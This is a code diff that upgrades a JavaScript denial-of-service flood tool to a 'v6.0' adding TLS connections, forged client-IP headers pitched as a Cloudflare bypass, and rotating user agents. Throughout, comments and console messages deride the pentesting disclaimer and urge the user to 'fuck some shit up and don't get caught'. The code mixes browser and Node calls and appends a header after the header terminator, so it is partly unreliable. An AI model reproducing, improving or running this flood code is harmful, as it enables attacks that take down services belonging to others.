@@ -1,10 +1,10 @@
 // ******************************************************************************
-// *   FUCK YEAH! THIS TOOL IS FOR PENTESTING ONLY! ILLEGAL USE IS PROHIBITED...  *
-// *   BUT WHO GIVES A SHIT? BIGMANCOZMO IS NOT RESPONSIBLE FOR MISUSE. HA!  *
+// * FUCK YEAH! THIS TOOL IS FOR PENTESTING ONLY! ILLEGAL USE IS PROHIBITED... *
+// * BUT WHO GIVES A SHIT? NOODLES INC. IS NOT RESPONSIBLE FOR MISUSE. HA! *
 // ******************************************************************************
 
 // ******************************************************************************
-// *               DDoS TOOL - TCP FLOOD - v5.0 - UNLEASH THE FURY!              *
+// * DDoS TOOL - TCP FLOOD - v6.0 - UNLEASH THE FURY! - NOW WITH CLOUDFLARE BYPASS! *
 // ******************************************************************************
 
 // Configuration - Let's fuck things up HARD!
@@ -23,6 +23,7 @@ const duration = parseInt(prompt("Enter duration in seconds (let's go long term 
 const logFile = "ddos_fuck_log.txt"; // Log file name - keep track of the carnage
 let isRunning = false; // Track attack status
 let onionSupport = confirm("Do you want to enable .onion support? This requires a Tor proxy running locally.");
+let cloudflareBypass = confirm("Attempt Cloudflare bypass? (May not always work, you dumbass!)");
 
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
@@ -74,20 +75,24 @@ function log(message) {
     }
 }
 
-// Modified TCP Flood function with .onion support
+// Modified TCP Flood function with .onion and Cloudflare support
 async function tcpFlood(threadId) {
     const net = require('net');
     const crypto = require('crypto');
     const socks = require('socks').SocksClient; // Required for .onion support
+    const tls = require('tls'); // Required for TLS/SSL
 
     const isTor = targetURL.protocol === 'onion:';
+    const isHTTPS = targetURL.protocol === 'https:';
 
-    log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${isTor ? '(via Tor)' : ''}${resetColor}`);
+    log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port} ${isTor ? '(via Tor)' : ''} ${cloudflareBypass ? '(attempting Cloudflare bypass)' : ''}${resetColor}`);
 
     while (isRunning) {
         try {
             const connect = () => {
                 return new Promise((resolve, reject) => {
+                    let socket;
+
                     if (isTor && onionSupport) {
                         const options = {
                             proxy: {
@@ -113,10 +118,25 @@ async function tcpFlood(threadId) {
                             resolve(socket);
                         });
                     } else {
-                        const socket = net.createConnection({ host: targetHost, port: port }, () => {
-                            log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
-                            resolve(socket);
-                        });
+                        if (isHTTPS) {
+                            // TLS/SSL connection
+                            const tlsOptions = {
+                                host: targetHost,
+                                port: port,
+                                rejectUnauthorized: false, // Allow self-signed certificates (for testing)
+                            };
+                            socket = tls.connect(tlsOptions, () => {
+                                log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port} (TLS)${resetColor}`);
+                                resolve(socket);
+                            });
+                        } else {
+                            // Regular TCP connection
+                            socket = net.createConnection({ host: targetHost, port: port }, () => {
+                                log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
+                                resolve(socket);
+                            });
+                        }
+
                         socket.on('error', (err) => {
                             log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
                             reject(err);
@@ -133,9 +153,17 @@ async function tcpFlood(threadId) {
                 payload += "Connection: keep-alive\r\n";
                 payload += "Cache-Control: max-age=0\r\n";
                 payload += "Upgrade-Insecure-Requests: 1\r\n";
-                payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n";
+
+                // Cloudflare Bypass - Add some extra headers to trick their shit
+                if (cloudflareBypass) {
+                    payload += "X-Forwarded-For: " + generateRandomIP() + "\r\n";
+                    payload += "X-Real-IP: " + generateRandomIP() + "\r\n";
+                    payload += "CF-Connecting-IP: " + generateRandomIP() + "\r\n";
+                }
+
+                payload += "User-Agent: " + getRandomUserAgent() + "\r\n";
                 payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
-                payload += "Accept-Encoding: gzip, deflate\r\n";
+                payload += "Accept-Encoding: gzip, deflate, br\r\n"; // Add brotli encoding
                 payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
                 payload += "X-Flooder: " + crypto.randomBytes(20).toString('hex') + "\r\n";
 
@@ -164,6 +192,25 @@ async function tcpFlood(threadId) {
 
     log(`${purple}[THREAD ${threadId}] TCP flood finished${resetColor}`);
 }
+
+// Helper Functions (gotta have those for the Cloudflare bypass)
+function generateRandomIP() {
+    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+}
+
+function getRandomUserAgent() {
+    const userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', // Added for coverage
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', // Added for coverage
+    ];
+    return userAgents[Math.floor(Math.random() * userAgents.length)];
+}
+
 
 // Timer Function
 function updateTimer() {
@@ -199,14 +246,14 @@ stopButton.addEventListener('click', () => {
 });
 
 // Explicit user consent required - just to cover our asses (sort of)
-if (confirm("WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. BIGMANCOZMO is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)")) {
+if (confirm("WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. NOODLES INC. is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)")) {
     // Do nothing here; the start button triggers the attack
 } else {
     window.close(); // Close the window if the user does not agree
 }
 
 // Educational Information (Can be expanded in the UI) - who gives a shit?
-console.log("%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up and don't get caught, you dumbass!", "color: darkblue;");
+console.log("%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up and don't get caught, you dumbass! We've also added some Cloudflare bypass techniques - don't expect miracles.", "color: darkblue;");
 
 // Security Headers (Example - adapt as needed for the server environment) - yeah right, as if we care.
 // This would typically be set server-side, but for demonstration:
